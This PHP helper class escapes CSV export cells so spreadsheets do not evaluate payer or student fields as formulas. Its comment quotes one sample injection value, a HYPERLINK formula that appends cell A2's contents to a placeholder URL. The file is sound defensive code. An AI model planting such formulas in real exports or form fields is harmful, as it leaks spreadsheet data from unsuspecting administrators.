<?php

namespace App\Support;

/**
 * Spreadsheet-safe CSV cells (M3).
 *
 * Excel, LibreOffice and Google Sheets evaluate a cell that begins with = + - @
 * (or a tab / carriage return that hides one) as a formula. Payer names, emails
 * and student details reach the export from a public form, so a payer named
 * `=HYPERLINK("https://…"&A2,"Click")` would run in the school admin's
 * spreadsheet. Such a value is prefixed with an apostrophe, which spreadsheets
 * treat as "this is text" and do not display; every other value is unchanged.
 */
final class CsvCell
{
    private const TRIGGERS = ['=', '+', '-', '@', "\t", "\r"];

    public static function safe(mixed $value): mixed
    {
        if (! is_string($value) || $value === '') {
            return $value;
        }

        return in_array($value[0], self::TRIGGERS, true) ? "'".$value : $value;
    }

    /** @param  array<int, mixed>  $row */
    public static function row(array $row): array
    {
        return array_map(self::safe(...), $row);
    }
}
